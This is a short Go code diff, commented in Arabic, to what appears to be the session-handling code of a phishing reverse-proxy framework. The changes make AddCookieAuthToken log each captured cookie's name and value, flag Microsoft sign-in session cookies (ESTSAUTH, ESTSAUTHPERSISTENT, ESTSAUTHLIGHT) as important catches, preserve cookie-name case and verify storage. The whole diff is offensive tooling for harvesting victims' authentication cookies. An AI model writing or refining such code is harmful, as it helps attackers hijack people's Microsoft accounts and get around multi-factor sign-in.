@@ -75,19 +75,41 @@ func (s *Session) SetCustom(name string, value string) {
 func (s *Session) AddCookieAuthToken(domain string, name string, value string, path string, httpOnly bool, expires time.Time) bool {
 	domain = strings.ToLower(domain)
 	
+	// تسجيل المعلومات التشخيصية
+	log.Debug("إضافة كوكي: %s = %s إلى المجال %s", name, value, domain)
+	
+	// تحقق من الكوكيز المهمة
+	importantCookies := []string{"ESTSAUTHPERSISTENT", "ESTSAUTH", "ESTSAUTHLIGHT"}
+	for _, cookieName := range importantCookies {
+		if strings.ToLower(name) == strings.ToLower(cookieName) {
+			log.Success("تمت محاولة إضافة كوكي مهم: %s = %s (المجال: %s)", name, value, domain)
+		}
+	}
+	
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
 	
-	s.CookieTokens[domain][name] = &database.CookieToken{
-		Name:     name,
+	// الاحتفاظ بحالة الأحرف الأصلية للاسم
+	originalName := name
+	
+	s.CookieTokens[domain][originalName] = &database.CookieToken{
+		Name:     originalName,
 		Value:    value,
 		Path:     path,
 		HttpOnly: httpOnly,
 	}
 
-	log.Success("تمت إضافة كوكي إلى الجلسة: %s=%s (المجال: %s)", name, value, domain)
-	return true
+	log.Success("تمت إضافة كوكي إلى الجلسة: %s=%s (المجال: %s)", originalName, value, domain)
+	
+	// تحقق من الإضافة
+	if token, exists := s.CookieTokens[domain][originalName]; exists {
+		log.Debug("تحقق من الإضافة: %s = %s", originalName, token.Value)
+		return true
+	} else {
+		log.Error("فشل إضافة الكوكي %s: غير موجود بعد الإضافة!", originalName)
+		return false
+	}
 }
 
 func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
